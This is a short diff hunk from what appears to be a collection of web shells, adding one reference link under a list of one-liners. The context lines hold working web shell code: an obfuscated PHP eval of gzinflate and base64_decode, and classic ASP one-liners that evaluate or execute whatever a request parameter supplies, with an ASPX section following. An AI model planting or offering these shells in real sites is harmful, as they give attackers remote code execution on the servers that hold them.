@@ -27,6 +27,8 @@ eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?
 <%eval_r(Request("0x001"))%>
 <%ExecuteGlobal request("sb")%>
 
+https://xz.aliyun.com/t/2356
+
 ------------------------------------------------------------------------------------------------------------
 # ASPX:
 ```
